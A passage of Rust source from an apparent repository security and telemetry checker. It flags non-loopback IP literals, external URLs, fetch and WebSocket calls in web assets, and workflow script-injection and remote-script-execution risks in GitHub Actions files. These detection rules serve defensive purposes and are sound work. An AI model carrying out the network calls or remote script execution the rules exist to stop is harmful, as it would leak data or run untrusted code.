    for pat in ["Ipv4Addr::UNSPECIFIED", "Ipv6Addr::UNSPECIFIED", "Ipv4Addr::BROADCAST"] {
        if let Some((pos, _)) = next_ident_pattern_match(&compact, 0, &[pat]) {
            let ln = base_line + lines.get(pos).copied().unwrap_or(1).saturating_sub(1);
            return Some((ln, pat.to_owned()));
        }
    }
    let compact_bytes = compact.as_bytes();
    for (ctor, expected_count, loopback_check) in [
        ("Ipv4Addr::new", 4usize, is_loopback_ipv4_octets as fn(&[u128]) -> bool),
        ("Ipv6Addr::new", 8usize, is_loopback_ipv6_segments as fn(&[u128]) -> bool),
    ] {
        let mut search = 0usize;
        while let Some(rel) = compact.get(search..).and_then(|s| s.find(ctor)) {
            let pos = search + rel;
            let mut open_paren = pos + ctor.len();
            while open_paren < compact_bytes.len() && compact_bytes[open_paren].is_ascii_whitespace() {
                open_paren += 1;
            }
            if compact_bytes.get(open_paren) == Some(&b'(')
                && let Some(close_paren) = find_matching_delim(&compact, open_paren, b'(', b')')
            {
                let inside = compact.get(open_paren + 1..close_paren).unwrap_or("");
                if let Some(nums) = parse_numeric_tuple_args(inside, expected_count)
                    && !loopback_check(&nums)
                {
                    let ln = base_line + lines.get(pos).copied().unwrap_or(1).saturating_sub(1);
                    return Some((ln, format!("{ctor}({inside})")));
                }
            }
            search = pos + ctor.len();
        }
    }
    for (ctor, is_v6) in [("Ipv4Addr::from", false), ("Ipv4Addr::from_bits", false), ("Ipv6Addr::from", true), ("Ipv6Addr::from_bits", true)] {
        let mut search = 0usize;
        while let Some(rel) = compact.get(search..).and_then(|s| s.find(ctor)) {
            let pos = search + rel;
            let mut open_paren = pos + ctor.len();
            while open_paren < compact_bytes.len() && compact_bytes[open_paren].is_ascii_whitespace() {
                open_paren += 1;
            }
            if compact_bytes.get(open_paren) == Some(&b'(')
                && let Some(close_paren) = find_matching_delim(&compact, open_paren, b'(', b')')
            {
                let inside = unwrap_outer_parens(compact.get(open_paren + 1..close_paren).unwrap_or(""));
                let is_non_loopback = if let Some(arr_inner) = inside.strip_prefix('[').and_then(|s| s.strip_suffix(']')) {
                    parse_rust_int_array(arr_inner).is_some_and(|nums| is_non_loopback_ip_array(&nums, Some(is_v6)))
                } else if let Some(bits) = parse_rust_int_u128(inside) {
                    if is_v6 {
                        !std::net::Ipv6Addr::from(bits).is_loopback()
                    } else {
                        u32::try_from(bits).is_ok_and(|v| !std::net::Ipv4Addr::from(v).is_loopback())
                    }
                } else {
                    false
                };
                if is_non_loopback {
                    let ln = base_line + lines.get(pos).copied().unwrap_or(1).saturating_sub(1);
                    return Some((ln, format!("{ctor}({inside})")));
                }
            }
            search = pos + ctor.len();
        }
    }
    // Check IPv4 (4-byte), IPv6 (8-u16 or 16-byte), and repeat-array `[v; 4|8|16]` literals in
    // socket tuple `([...], port)` or `IpAddr::from([...])` / `Ipv{4,6}Addr::from([...])` context,
    // unwrapping arbitrary surrounding parentheses `(([0; 4]))`.
    let bytes = compact.as_bytes();
    let mut i = 0usize;
    while i < bytes.len() {
        if bytes[i] == b'['
            && let Some(close_idx) = find_matching_delim(&compact, i, b'[', b']')
        {
            let inner = compact.get(i + 1..close_idx).unwrap_or("");
            if let Some(nums) = parse_rust_int_array(inner)
                && is_non_loopback_ip_array(&nums, None)
            {
                let mut left = i;
                let mut right = close_idx + 1;
                let mut matched = false;
                loop {
                    let before = compact.get(..left).unwrap_or("").trim_end();
                    let after = compact.get(right..).unwrap_or("").trim_start();
                    let in_sock_tuple = before.ends_with('(') && after.starts_with(',');
                    let in_ip_from = before
                        .strip_suffix('(')
                        .map(str::trim_end)
                        .is_some_and(|b| b.ends_with("IpAddr::from") || b.ends_with("Ipv4Addr::from") || b.ends_with("Ipv6Addr::from"));
                    if in_sock_tuple || in_ip_from {
                        matched = true;
                        break;
                    }
                    if before.ends_with('(') && after.starts_with(')') {
                        left = before.len() - 1;
                        right = compact.len() - after.len() + 1;
                    } else {
                        break;
                    }
                }
                if matched {
                    let ln = base_line + lines.get(i).copied().unwrap_or(1).saturating_sub(1);
                    return Some((ln, format!("[{inner}]")));
                }
            }
        }
        i += 1;
    }
    None
}

fn find_matching_delim(s: &str, open_pos: usize, open: u8, close: u8) -> Option<usize> {
    let bytes = s.as_bytes();
    if bytes.get(open_pos) != Some(&open) {
        return None;
    }
    let mut depth = 1usize;
    let mut i = open_pos + 1;
    while i < bytes.len() {
        if bytes[i] == open {
            depth += 1;
        } else if bytes[i] == close {
            depth -= 1;
            if depth == 0 {
                return Some(i);
            }
        }
        i += 1;
    }
    None
}

fn unwrap_outer_parens(raw: &str) -> &str {
    let mut cur = raw.trim();
    while cur.starts_with('(') && find_matching_delim(cur, 0, b'(', b')') == Some(cur.len() - 1) {
        cur = cur.get(1..cur.len() - 1).unwrap_or(cur).trim();
    }
    cur
}

fn split_top_level_delim(s: &str, sep: u8) -> Vec<&str> {
    let bytes = s.as_bytes();
    let mut out = Vec::new();
    let mut start = 0usize;
    let mut paren = 0usize;
    let mut bracket = 0usize;
    for (i, &b) in bytes.iter().enumerate() {
        match b {
            b'(' => paren += 1,
            b')' => paren = paren.saturating_sub(1),
            b'[' => bracket += 1,
            b']' => bracket = bracket.saturating_sub(1),
            _ if b == sep && paren == 0 && bracket == 0 => {
                out.push(s.get(start..i).unwrap_or("").trim());
                start = i + 1;
            }
            _ => {}
        }
    }
    out.push(s.get(start..).unwrap_or("").trim());
    out
}

fn parse_rust_int_u128(raw: &str) -> Option<u128> {
    let mut cur = raw.trim();
    loop {
        let unwrapped = unwrap_outer_parens(cur);
        let stripped_cast = ["u8", "u16", "u32", "u64", "u128", "usize", "i8", "i16", "i32", "i64", "i128", "isize"].iter().find_map(|ty| {
            let before_ty = unwrapped.strip_suffix(ty)?;
            let before_ws = before_ty.trim_end();
            if before_ws.len() == before_ty.len() {
                return None;
            }
            let before_as = before_ws.strip_suffix("as")?;
            if before_as.is_empty() || before_as.as_bytes().last().is_some_and(|b| is_ident_byte(*b)) {
                return None;
            }
            Some(before_as.trim_end())
        });
        let next = stripped_cast.unwrap_or(unwrapped);
        if next == cur {
            break;
        }
        cur = next;
    }
    let no_suffix = ["u128", "u64", "u32", "u16", "u8", "usize", "i128", "i64", "i32", "i16", "i8", "isize"]
        .iter()
        .find_map(|sfx| cur.strip_suffix(sfx))
        .unwrap_or(cur);
    let cleaned = no_suffix.replace('_', "");
    if cleaned.is_empty() {
        return None;
    }
    if let Some(hex) = cleaned.strip_prefix("0x").or_else(|| cleaned.strip_prefix("0X")) {
        u128::from_str_radix(hex, 16).ok()
    } else if let Some(bin) = cleaned.strip_prefix("0b").or_else(|| cleaned.strip_prefix("0B")) {
        u128::from_str_radix(bin, 2).ok()
    } else if let Some(oct) = cleaned.strip_prefix("0o").or_else(|| cleaned.strip_prefix("0O")) {
        u128::from_str_radix(oct, 8).ok()
    } else {
        cleaned.parse::<u128>().ok()
    }
}

fn parse_rust_int_array(inner: &str) -> Option<Vec<u128>> {
    let semi_parts = split_top_level_delim(inner, b';');
    if semi_parts.len() == 2 {
        let val = parse_rust_int_u128(semi_parts[0])?;
        let count = usize::try_from(parse_rust_int_u128(semi_parts[1])?).ok()?;
        if matches!(count, 4 | 8 | 16) {
            return Some(vec![val; count]);
        }
        return None;
    }
    let parts: Vec<&str> = split_top_level_delim(inner, b',').into_iter().filter(|s| !s.is_empty()).collect();
    if !matches!(parts.len(), 4 | 8 | 16) {
        return None;
    }
    let mut nums = Vec::with_capacity(parts.len());
    for p in parts {
        nums.push(parse_rust_int_u128(p)?);
    }
    Some(nums)
}

fn is_non_loopback_ip_array(nums: &[u128], expect_v6: Option<bool>) -> bool {
    match (nums.len(), expect_v6) {
        (4, None | Some(false)) => nums.iter().all(|&n| n <= 255) && !is_loopback_ipv4_octets(nums),
        (8, None | Some(true)) => nums.iter().all(|&n| n <= 0xFFFF) && !is_loopback_ipv6_segments(nums),
        (16, None | Some(true)) => nums.iter().all(|&n| n <= 255) && !is_loopback_ipv6_bytes(nums),
        _ => false,
    }
}

fn parse_numeric_tuple_args(inside: &str, expected: usize) -> Option<Vec<u128>> {
    let parts: Vec<&str> = split_top_level_delim(inside, b',').into_iter().filter(|s| !s.is_empty()).collect();
    if parts.len() != expected {
        return None;
    }
    let mut nums = Vec::with_capacity(expected);
    for p in parts {
        nums.push(parse_rust_int_u128(p)?);
    }
    Some(nums)
}

fn is_loopback_ipv4_octets(octets: &[u128]) -> bool {
    octets.first() == Some(&127)
}

fn is_loopback_ipv6_segments(segs: &[u128]) -> bool {
    segs == [0, 0, 0, 0, 0, 0, 0, 1]
}

fn is_loopback_ipv6_bytes(bytes: &[u128]) -> bool {
    bytes == [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1]
}

fn check_non_loopback_host_or_ip(lit: &str) -> Option<String> {
    let trimmed = lit.trim();
    if trimmed.is_empty() {
        return None;
    }
    if let Ok(sock) = trimmed.parse::<std::net::SocketAddr>() {
        return (!sock.ip().is_loopback()).then(|| trimmed.to_owned());
    }
    if let Ok(ip) = trimmed.parse::<std::net::IpAddr>() {
        return (!ip.is_loopback()).then(|| trimmed.to_owned());
    }
    let inner = trimmed.strip_prefix('[').and_then(|s| s.strip_suffix(']')).unwrap_or(trimmed);
    if let Ok(ip) = inner.parse::<std::net::IpAddr>() {
        return (!ip.is_loopback()).then(|| trimmed.to_owned());
    }
    if let Some((host, port)) = trimmed.rsplit_once(':')
        && port.parse::<u16>().is_ok()
    {
        let clean_host = host.strip_prefix('[').and_then(|s| s.strip_suffix(']')).unwrap_or(host);
        if let Ok(ip) = clean_host.parse::<std::net::IpAddr>() {
            return (!ip.is_loopback()).then(|| trimmed.to_owned());
        }
        if !clean_host.is_empty()
            && !clean_host.eq_ignore_ascii_case("localhost")
            && clean_host.contains('.')
            && clean_host.bytes().all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'-'))
            && clean_host.bytes().any(|b| b.is_ascii_alphabetic())
        {
            return Some(trimmed.to_owned());
        }
    }
    None
}

fn scan_code_patterns_with_lines(
    rel: &str,
    code: &str,
    line_of_byte: &[usize],
    check: u8,
    patterns: &[&'static str],
    reason: &str,
    violations: &mut Vec<TelemetryViolation>,
) {
    let mut pos = 0usize;
    while pos < code.len() {
        if let Some((hit_pos, pat)) = next_ident_pattern_match(code, pos, patterns) {
            let line = line_of_byte.get(hit_pos).copied().unwrap_or(1);
            violations.push(TelemetryViolation { check, path: rel.to_owned(), line, detail: format!("{reason} `{pat}`") });
            pos = hit_pos + pat.len();
        } else {
            break;
        }
    }
}

fn skip_workspace_dir(path: &Path) -> bool {
    path.file_name().and_then(|n| n.to_str()).is_some_and(|s| matches!(s, "target" | "dist" | "corpus") || s.starts_with('.'))
}

fn collect_non_test_src_rs_files(root: &Path, dir: &Path, out: &mut Vec<String>) -> Result<(), String> {
    let mut paths = Vec::new();
    walk_file_paths(dir, &skip_workspace_dir, &|p| has_ext_ci(p, &["rs"]), &mut paths)?;
    for path in paths {
        let rel = rel_slash_lossy(root, &path);
        let is_prod_src = rel.contains("/src/") && !is_cfg_test_only_submodule(root, &rel);
        let is_build_rs = rel == "build.rs" || rel.ends_with("/build.rs");
        if is_prod_src || is_build_rs {
            out.push(rel);
        }
    }
    Ok(())
}

/// Check 3: scan `.github/{workflows,actions}/*.{yml,yaml}`, `apps/curvebook-web/**`, and `packaging/**` for
/// telemetry/analytics/cloud-service markers and external URLs / browser network APIs across web assets.
fn check_web_and_workflow_telemetry(root: &Path, violations: &mut Vec<TelemetryViolation>) -> Result<usize, String> {
    let mut targets = collect_workflow_and_action_files(root)?;
    for dir_name in ["apps/curvebook-web", "packaging"] {
        let dir = root.join(dir_name);
        if is_real_dir(&dir) {
            walk_rel_files(
                root,
                &dir,
                &|p| p.file_name().and_then(|n| n.to_str()).is_some_and(|s| matches!(s, "target" | "dist" | ".git")),
                &|_| true,
                &mut targets,
            )?;
        }
    }
    targets.sort();
    targets.dedup();

    let mut scanned = 0usize;
    let mut web_asset_files = Vec::new();
    for rel in &targets {
        let bytes = std::fs::read(root.join(rel)).map_err(|e| format!("{rel}: {e}"))?;
        let text = match crate::text_decode::decode_utf8_or_utf16(&bytes) {
            Ok(Some(decoded)) => decoded,
            _ => {
                if is_binary_web_asset_blob(rel, &bytes) {
                    continue;
                }
                if bytes.contains(&0) {
                    let cleaned: Vec<u8> = bytes.iter().copied().filter(|&b| b != 0).collect();
                    String::from_utf8_lossy(&cleaned).into_owned()
                } else {
                    String::from_utf8_lossy(&bytes).into_owned()
                }
            }
        };
        scanned += 1;
        scan_text_for_web_telemetry(rel, &text, violations);
        if is_web_asset_file(rel) {
            web_asset_files.push((rel.clone(), text));
        }
    }

    let index_rel = "apps/curvebook-web/index.html";
    if !root.join(index_rel).is_file() {
        push_v(violations, 3, index_rel, 1, "missing apps/curvebook-web/index.html");
    }
    for (rel, text) in web_asset_files {
        scan_web_asset_external_urls_and_apis(&rel, &text, violations);
    }

    Ok(scanned)
}

fn is_binary_web_asset_blob(rel: &str, bytes: &[u8]) -> bool {
    if matches!(
        lower_ext(rel).as_str(),
        "png" | "jpg" | "jpeg" | "gif" | "webp" | "ico" | "icns" | "ttf" | "otf" | "woff" | "woff2" | "wasm" | "zip" | "pdf"
    ) {
        return true;
    }
    !is_web_asset_file(rel)
        && [&b"\x89PNG\r\n\x1a\n"[..], b"PK\x03\x04", b"\x00asm", b"wOF2", b"OTTO", b"\x00\x01\x00\x00"].iter().any(|sig| bytes.starts_with(sig))
}

fn is_web_asset_file(rel: &str) -> bool {
    (rel.starts_with("apps/curvebook-web/") || rel.starts_with("packaging/web/"))
        && matches!(lower_ext(rel).as_str(), "html" | "htm" | "js" | "mjs" | "cjs" | "ts" | "jsx" | "tsx" | "css" | "svg" | "json")
}

fn is_browser_markup_or_script(rel: &str) -> bool {
    matches!(lower_ext(rel).as_str(), "html" | "htm" | "js" | "mjs" | "cjs" | "ts" | "jsx" | "tsx" | "svg")
}

fn normalize_js_member_syntax(lower_line: &str) -> String {
    let mut out = String::with_capacity(lower_line.len());
    let bytes = lower_line.as_bytes();
    let mut i = 0usize;
    while i < bytes.len() {
        if bytes[i] == b'[' {
            let mut j = i + 1;
            while j < bytes.len() && bytes[j].is_ascii_whitespace() {
                j += 1;
            }
            if let Some(&q @ (b'\'' | b'"' | b'`')) = bytes.get(j) {
                j += 1;
                let ident_start = j;
                while j < bytes.len() && bytes[j] != q && bytes[j] != b'\n' {
                    j += 1;
                }
                if bytes.get(j) == Some(&q)
                    && let Some(raw_ident) = lower_line.get(ident_start..j)
                {
                    let ident = raw_ident.trim();
                    let mut k = j + 1;
                    while k < bytes.len() && bytes[k].is_ascii_whitespace() {
                        k += 1;
                    }
                    if bytes.get(k) == Some(&b']') && !ident.is_empty() && ident.bytes().all(is_ident_byte) {
                        out.push('.');
                        out.push_str(ident);
                        i = k + 1;
                        continue;
                    }
                }
            }
        }
        let ch = lower_line.get(i..).and_then(|s| s.chars().next()).unwrap_or(' ');
        out.push(ch);
        i += ch.len_utf8();
    }
    out
}

fn scan_text_for_web_telemetry(rel: &str, text: &str, violations: &mut Vec<TelemetryViolation>) {
    let check_fetch = is_browser_markup_or_script(rel);
    for (idx, line) in text.lines().enumerate() {
        let decoded = crate::text_decode::decode_xml_html_entities(line);
        let lower = normalize_js_member_syntax(&decoded.to_ascii_lowercase());
        for &term in BANNED_WEB_AND_WORKFLOW_TERMS {
            if contains_telemetry_term(&lower, term) {
                violations.push(TelemetryViolation {
                    check: 3,
                    path: rel.to_owned(),
                    line: idx + 1,
                    detail: format!("forbidden telemetry/cloud-service reference `{term}`"),
                });
            }
        }
        if check_fetch && contains_browser_fetch_call(&lower) {
            violations.push(TelemetryViolation {
                check: 3,
                path: rel.to_owned(),
                line: idx + 1,
                detail: String::from("forbidden network `fetch(` call"),
            });
        }
    }
}

fn contains_telemetry_term(lower_line: &str, term: &str) -> bool {
    let bytes = lower_line.as_bytes();
    let mut start = 0usize;
    while let Some(rel) = lower_line.get(start..).and_then(|s| s.find(term)) {
        let pos = start + rel;
        let end = pos + term.len();
        let left_ok = pos == 0 || !bytes[pos - 1].is_ascii_alphanumeric();
        let right_needs_boundary = term.as_bytes().last().is_some_and(u8::is_ascii_alphanumeric);
        let right_ok = !right_needs_boundary || end == bytes.len() || !bytes[end].is_ascii_alphanumeric();
        if left_ok && right_ok {
            return true;
        }
        start = pos + lower_line.get(pos..).and_then(|s| s.chars().next()).map_or(1, char::len_utf8);
    }
    false
}

fn contains_browser_fetch_call(lower_line: &str) -> bool {
    let bytes = lower_line.as_bytes();
    let needle = "fetch";
    let mut start = 0usize;
    while let Some(rel) = lower_line.get(start..).and_then(|s| s.find(needle)) {
        let pos = start + rel;
        let after_ws = lower_line.get(pos + needle.len()..).unwrap_or("").trim_start();
        let followed_by_paren = after_ws.starts_with('(');
        let left_is_ok = pos == 0
            || (bytes[pos - 1] != b'.' && !is_ident_byte(bytes[pos - 1]))
            || (bytes[pos - 1] == b'.' && lower_line.get(..pos).is_some_and(is_global_fetch_receiver));
        if followed_by_paren && left_is_ok {
            return true;
        }
        start = pos + 1;
    }
    false
}

fn is_global_fetch_receiver(before_fetch: &str) -> bool {
    let trimmed = before_fetch.trim_end();
    ["window.", "globalthis.", "self."].iter().any(|recv| {
        if let Some(prefix) = trimmed.strip_suffix(recv) { prefix.is_empty() || !is_ident_byte(prefix.as_bytes()[prefix.len() - 1]) } else { false }
    })
}

fn scan_web_asset_external_urls_and_apis(rel: &str, content: &str, violations: &mut Vec<TelemetryViolation>) {
    let is_css = rel.ends_with(".css");
    for (idx, line) in content.lines().enumerate() {
        let decoded = crate::text_decode::decode_xml_html_entities(line);
        let decoded_lower = decoded.to_ascii_lowercase();
        let norm_lower = normalize_js_member_syntax(&decoded_lower);
        for scheme in ["https://", "http://", "wss://", "ws://"] {
            let mut start = 0usize;
            while let Some(offset) = decoded_lower.get(start..).and_then(|s| s.find(scheme)) {
                let pos = start + offset;
                let rest = decoded.get(pos..).unwrap_or("");
                let end = rest.find(|c: char| c.is_whitespace() || matches!(c, '"' | '\'' | '<' | '>' | ')' | ';' | '`' | ',')).unwrap_or(rest.len());
                let url = rest.get(..end).unwrap_or(rest);
                if !ALLOWED_HTML_EXTERNAL_URLS.iter().any(|allowed| url.eq_ignore_ascii_case(allowed)) {
                    violations.push(TelemetryViolation {
                        check: 3,
                        path: rel.to_owned(),
                        line: idx + 1,
                        detail: format!("external URL `{url}` is forbidden in web assets"),
                    });
                }
                start = pos + scheme.len();
            }
        }
        scan_protocol_relative_urls(rel, idx + 1, &decoded, violations);
        if !is_css {
            scan_web_network_api_tokens(rel, idx + 1, &norm_lower, violations);
        }
    }
}

fn scan_protocol_relative_urls(rel: &str, line_no: usize, line: &str, violations: &mut Vec<TelemetryViolation>) {
    let bytes = line.as_bytes();
    let mut pos = 0usize;
    while let Some(offset) = line.get(pos..).and_then(|s| s.find("//")) {
        let hit = pos + offset;
        let prev_ok = hit > 0 && matches!(bytes[hit - 1], b'=' | b'"' | b'\'' | b'`' | b'(');
        let after = line.get(hit + 2..).unwrap_or("");
        let end = after.find(|c: char| c.is_whitespace() || matches!(c, '"' | '\'' | '<' | '>' | ')' | ';' | '`' | ',')).unwrap_or(after.len());
        let target = after.get(..end).unwrap_or(after);
        let host = target.split('/').next().unwrap_or(target);
        let looks_like_host = !host.is_empty()
            && host.bytes().all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'-' | b':'))
            && (host.contains('.') || host.eq_ignore_ascii_case("localhost"));
        if prev_ok && looks_like_host {
            violations.push(TelemetryViolation {
                check: 3,
                path: rel.to_owned(),
                line: line_no,
                detail: format!("protocol-relative external URL `//{target}` is forbidden in web assets"),
            });
        }
        pos = hit + 2;
    }
}

fn scan_web_network_api_tokens(rel: &str, line_no: usize, lower: &str, violations: &mut Vec<TelemetryViolation>) {
    for api in ["websocket", "eventsource", "sharedworker", "serviceworker"] {
        let mut start = 0usize;
        while let Some(offset) = lower.get(start..).and_then(|s| s.find(api)) {
            let pos = start + offset;
            let bytes = lower.as_bytes();
            let left_ok = pos == 0 || !is_ident_byte(bytes[pos - 1]);
            let right_ok = pos + api.len() == bytes.len() || !is_ident_byte(bytes[pos + api.len()]);
            if left_ok && right_ok {
                violations.push(TelemetryViolation {
                    check: 3,
                    path: rel.to_owned(),
                    line: line_no,
                    detail: format!("forbidden browser network/worker API `{api}` in web asset"),
                });
                break;
            }
            start = pos + 1;
        }
    }
    let mut pos = 0usize;
    while let Some(offset) = lower.get(pos..).and_then(|s| s.find("worker")) {
        let hit = pos + offset;
        let left_ok = hit == 0 || !is_ident_byte(lower.as_bytes()[hit - 1]);
        let after_ws = lower.get(hit + "worker".len()..).unwrap_or("").trim_start();
        if left_ok && after_ws.starts_with('(') {
            violations.push(TelemetryViolation {
                check: 3,
                path: rel.to_owned(),
                line: line_no,
                detail: String::from("forbidden browser network/worker API `worker(` in web asset"),
            });
            break;
        }
        pos = hit + 1;
    }
}

/// Check 4: GitHub Actions workflow/composite-action permissions and `run:` script-injection hygiene.
fn check_workflow_security(root: &Path, violations: &mut Vec<TelemetryViolation>) -> Result<usize, String> {
    let workflows = collect_workflow_and_action_files(root)?;
    if workflows.is_empty() {
        violations.push(TelemetryViolation {
            check: 4,
            path: String::from(".github/workflows"),
            line: 1,
            detail: String::from("no GitHub Actions workflow files found"),
        });
        return Ok(0);
    }

    for rel in &workflows {
        let text = std::fs::read_to_string(root.join(rel)).map_err(|e| format!("{rel}: {e}"))?;
        let require_permissions = !rel.starts_with(".github/actions/");
        audit_workflow_yaml(rel, &text, require_permissions, violations);
    }
    Ok(workflows.len())
}

#[derive(Default)]
struct WorkflowParseState {
    in_jobs: bool,
    jobs_indent: usize,
    job_indent: Option<usize>,
    current_job: Option<String>,
    steps_indent: Option<usize>,
    flow_steps_bracket_depth: usize,
    flow_step_brace_depth: usize,
    top_perm_indent: Option<usize>,
    job_perm_indent: Option<usize>,
    flow_perm_is_top: Option<bool>,
    saw_top_permissions: bool,
    top_has_contents_read: bool,
    run_block: Option<RunBlockAccum>,
}

struct RunBlockAccum {
    key_col: usize,
    open_quote: Option<u8>,
    lines: Vec<(usize, String)>,
}

/// Split comma-separated entries inside a YAML flow mapping `{ ... }`, respecting quotes and `${{ ... }}`.
fn split_yaml_flow_entries(inner: &str) -> Vec<&str> {
    let bytes = inner.as_bytes();
    let mut out = Vec::new();
    let mut start = 0usize;
    let mut quote: Option<u8> = None;
    let mut brace_depth = 0usize;
    let mut i = 0usize;
    while i < bytes.len() {
        let b = bytes[i];
        if let Some(q) = quote {
            if b == b'\\' && q == b'"' {
                i += 2;
                continue;
            }
            if b == q {
                if q == b'\'' && bytes.get(i + 1) == Some(&b'\'') {
                    i += 2;
                    continue;
                }
                quote = None;
            }
        } else {
            match b {
                b'"' | b'\'' => quote = Some(b),
                b'{' => brace_depth += 1,
                b'}' => brace_depth = brace_depth.saturating_sub(1),
                b',' if brace_depth == 0 => {
                    let seg = inner.get(start..i).unwrap_or("").trim();
                    if !seg.is_empty() {
                        out.push(seg);
                    }
                    start = i + 1;
                }
                _ => {}
            }
        }
        i += 1;
    }
    let tail = inner.get(start..).unwrap_or("").trim();
    if !tail.is_empty() {
        out.push(tail);
    }
    out
}

fn find_unquoted_closing_brace(s: &str) -> Option<usize> {
    let bytes = s.as_bytes();
    let mut quote: Option<u8> = None;
    let mut depth = 0usize;
    let mut i = 0usize;
    while i < bytes.len() {
        let b = bytes[i];
        if let Some(q) = quote {
            if b == b'\\' && q == b'"' {
                i += 2;
                continue;
            }
            if b == q {
                if q == b'\'' && bytes.get(i + 1) == Some(&b'\'') {
                    i += 2;
                    continue;
                }
                quote = None;
            }
        } else {
            match b {
                b'"' | b'\'' => quote = Some(b),
                b'{' => depth += 1,
                b'}' => {
                    if depth == 0 {
                        return Some(i);
                    }
                    depth -= 1;
                }
                _ => {}
            }
        }
        i += 1;
    }
    None
}

fn split_yaml_unquoted_key(trimmed: &str) -> Option<(&str, &str)> {
    let bytes = trimmed.as_bytes();
    let mut quote: Option<u8> = None;
    let mut i = 0usize;
    while i < bytes.len() {
        let b = bytes[i];
        if let Some(q) = quote {
            if b == b'\\' && q == b'"' {
                i += 2;
                continue;
            }
            if b == q {
                quote = None;
            }
        } else if b == b'"' || b == b'\'' {
            quote = Some(b);
        } else if b == b':' && bytes.get(i + 1).is_none_or(|n| n.is_ascii_whitespace()) {
            let (raw_key, after_colon) = trimmed.split_at_checked(i)?;
            let key = unquote_scalar(raw_key.trim());
            let rhs = after_colon.strip_prefix(':').unwrap_or(after_colon).trim();
            return Some((key, rhs));
        }
        i += 1;
    }
    None
}

fn line_closes_yaml_quote(raw: &str, quote: u8) -> bool {
    let trimmed = strip_yaml_comment(raw).trim_end().trim_end_matches(',').trim_end();
    let bytes = trimmed.as_bytes();
    if bytes.last() != Some(&quote) {
        return false;
    }
    if quote == b'"' {
        let mut bs = 0usize;
        let mut idx = bytes.len().saturating_sub(1);
        while idx > 0 && bytes[idx - 1] == b'\\' {
            bs += 1;
            idx -= 1;
        }
        bs.is_multiple_of(2)
    } else {
        // YAML single-quoted scalar escapes `'` as `''`; an odd trailing run of `'` closes it.
        let run = bytes.iter().rev().take_while(|&&b| b == b'\'').count();
        !run.is_multiple_of(2)
    }
}

fn flush_run_block(rel: &str, state: &mut WorkflowParseState, violations: &mut Vec<TelemetryViolation>) {
    let Some(block) = state.run_block.take() else {
        return;
    };
    if block.lines.is_empty() {
        return;
    }
    let mut combined = String::new();
    let mut offset_lines = Vec::new();
    for (idx, (ln, txt)) in block.lines.iter().enumerate() {
        if idx > 0 {
            combined.push('\n');
            offset_lines.push(*ln);
        }
        combined.push_str(txt);
        offset_lines.extend(std::iter::repeat_n(*ln, txt.len()));
    }
    flag_untrusted_event_expr_spans(rel, &combined, &offset_lines, violations);

    if let Some(q) = block.open_quote {
        // Multiline YAML quoted scalars fold line breaks into spaces and terminate with a matching quote.
        let mut folded = String::new();
        for (idx, (_, raw)) in block.lines.iter().enumerate() {
            let piece = if idx == 0 { raw.as_str() } else { raw.trim() };
            if !folded.is_empty() && !piece.is_empty() {
                folded.push(' ');
            }
            folded.push_str(piece);
        }
        let cleaned = folded.trim_end().trim_end_matches(',').trim_end();
        let unquoted = cleaned.strip_suffix(char::from(q)).unwrap_or(cleaned);
        flag_remote_script_execution(rel, block.lines[0].0, unquoted, violations);
        return;
    }

    let mut logical_line_no = block.lines[0].0;
    let mut logical_cmd = String::new();
    for (ln, raw) in &block.lines {
        if logical_cmd.is_empty() {
            logical_line_no = *ln;
        }
        let code = strip_yaml_comment(raw).trim_end();
        if let Some(continued) = code.strip_suffix('\\') {
            logical_cmd.push_str(continued.trim_end());
            logical_cmd.push(' ');
        } else {
            logical_cmd.push_str(code);
            flag_remote_script_execution(rel, logical_line_no, &logical_cmd, violations);
            logical_cmd.clear();
        }
    }
    if !logical_cmd.is_empty() {
        flag_remote_script_execution(rel, logical_line_no, &logical_cmd, violations);
    }
}

fn audit_workflow_yaml(rel: &str, yaml: &str, require_permissions: bool, violations: &mut Vec<TelemetryViolation>) {
    let mut state = WorkflowParseState::default();
    for (idx, raw) in yaml.lines().enumerate() {
        let line_no = idx + 1;
        if let Some(ref mut block) = state.run_block {
            let lead = leading_spaces(raw);
            let cont = raw.trim().is_empty() || lead > block.key_col || (block.open_quote.is_some() && lead >= block.key_col);
            if cont {
                let closes_quote = block.open_quote.is_some_and(|q| line_closes_yaml_quote(raw, q));
                block.lines.push((line_no, raw.to_owned()));
                if closes_quote {
                    flush_run_block(rel, &mut state, violations);
                }
                continue;
            }
            flush_run_block(rel, &mut state, violations);
        }

        let code = strip_yaml_comment(raw);
        let trimmed = code.trim();
        if trimmed.is_empty() {
            continue;
        }
        let indent = leading_spaces(code);
        update_workflow_scope(&mut state, indent, trimmed);
        if handle_permissions_line(rel, line_no, indent, trimmed, &mut state, violations) {
            continue;
        }
        // Handle flow-sequence `steps: [{ uses: ..., run: ... }]` and single/multiline flow step maps `{ ... }`.
        if handle_flow_steps_line(rel, line_no, trimmed, &mut state, violations) {
            continue;
        }
        check_workflow_uses_sha(rel, line_no, code, violations);
        check_run_directive(rel, line_no, indent, code, &mut state, violations);
    }
    flush_run_block(rel, &mut state, violations);

    if require_permissions && (!state.saw_top_permissions || !state.top_has_contents_read) {
        violations.push(TelemetryViolation {
            check: 4,
            path: rel.to_owned(),
            line: 1,
            detail: String::from("workflow must declare top-level `permissions:` containing `contents: read`"),
        });
    }
}

fn handle_flow_steps_line(
    rel: &str,
    line_no: usize,
    trimmed: &str,
    state: &mut WorkflowParseState,
    violations: &mut Vec<TelemetryViolation>,
) -> bool {
    let flow_slice = if state.flow_step_brace_depth > 0 || state.flow_steps_bracket_depth > 0 {
        Some(trimmed)
    } else if let Some((key, rhs)) = split_yaml_unquoted_key(trimmed)
        && key == "steps"
        && rhs.starts_with('[')
    {
        Some(rhs)
    } else if state.steps_indent.is_some() && trimmed.starts_with('[') {
        Some(trimmed)
    } else if state.steps_indent.is_some()
        && let Some((key, rhs)) = split_yaml_unquoted_key(trimmed.strip_prefix('-').map_or(trimmed, str::trim_start))
        && key == "with"
        && rhs.starts_with('{')
    {
        Some(rhs)
    } else {
        let step_body = trimmed.strip_prefix('-').map_or(trimmed, str::trim_start);
        step_body.starts_with('{').then_some(step_body)
    };
    let Some(slice) = flow_slice else {
        return false;
    };
    audit_flow_step_chunk(rel, line_no, slice, state, violations);
    true
}

fn audit_flow_step_chunk(rel: &str, line_no: usize, chunk: &str, state: &mut WorkflowParseState, violations: &mut Vec<TelemetryViolation>) {
    let bytes = chunk.as_bytes();
    let mut quote: Option<u8> = None;
